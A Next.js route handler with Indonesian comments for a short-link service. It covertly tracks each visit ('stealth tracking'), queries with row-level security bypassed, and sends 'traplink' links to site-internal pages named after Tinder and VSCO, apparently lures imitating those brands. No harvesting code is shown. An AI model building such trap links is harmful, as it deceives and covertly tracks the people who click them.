import { credentialsConfig } from '@/config/credentials.config';
import { bypassRLS } from '@/lib/db';
import { trackPageView } from '@/lib/tracking';
import { getCurrentEpoch } from '@/lib/utils';
import { revalidatePath } from 'next/cache';
import { NextRequest, NextResponse } from 'next/server';

export async function GET(
  req: NextRequest,
  { params }: { params: { short: string; lang: string } },
) {
  const shortCode = params.short;
  const lang = params.lang || 'en';
  const pathname = req.headers.get('x-next-pathname') || '';

  // Ambil base URL untuk digunakan pada URL absolut
  const baseUrl = credentialsConfig.siteUrl || new URL(req.url).origin;

  // Menggunakan stealth tracking utility
  await trackPageView({
    pageType: 'link',
    shortCode: shortCode,
  });

  const noRLS = await bypassRLS();
  // Get the link
  const link = await noRLS.links.findUnique({
    where: {
      short_code: shortCode,
    },
    select: {
      id: true,
      short_code: true,
      original_url: true,
      title: true,
      is_active: true,
      expires_at: true,
      created_at: true,
      updated_at: true,
      type: true,
      page_type: true,
    },
  });
  console.log('Redirecting to trap:', baseUrl);

  // Debug logging yang lebih detail
  console.log('Link data:', {
    shortCode,
    link,
    isActive: link?.is_active,
    type: link?.type,
    pageType: link?.page_type,
    expiresAt: link?.expires_at,
    currentEpoch: getCurrentEpoch(),
    isTraplink: link?.type === 'traplink',
    hasPageType: !!link?.page_type,
    conditionMet: link?.type === 'traplink' && !!link?.page_type,
    originalUrl: link?.original_url,
  });

  if (
    !link ||
    !link.is_active ||
    (link.expires_at && link.expires_at < getCurrentEpoch())
  ) {
    console.log('Link tidak valid:', {
      linkExists: !!link,
      isActive: link?.is_active,
      expiresAt: link?.expires_at,
      currentEpoch: getCurrentEpoch(),
    });
    // Gunakan URL absolut untuk redirect ke 404
    return NextResponse.redirect(new URL('/404', baseUrl));
  }

  revalidatePath('/dashboard');

  // Cek apakah tipe link adalah traplink dan ada page_type
  if (link.type === 'traplink' && link.page_type) {
    // Jika ada page_type, redirect ke halaman yang sesuai

    if (link.page_type === 'tinder') {
      return NextResponse.redirect(
        new URL(`/${lang}/tinder?shortcode=${shortCode}`, baseUrl),
      );
    } else if (link.page_type === 'vsco') {
      console.log('Redirecting to VSCO page with shortcode:', shortCode);
      return NextResponse.redirect(
        new URL(`/${lang}/vsco?shortcode=${shortCode}`, baseUrl),
      );
    }
  }

  // Jika URL asli sudah absolut, gunakan langsung
  if (link.original_url.startsWith('http')) {
    return NextResponse.redirect(link.original_url);
  }

  // Jika tidak, gabungkan dengan base URL
  return NextResponse.redirect(new URL(link.original_url, baseUrl));
}
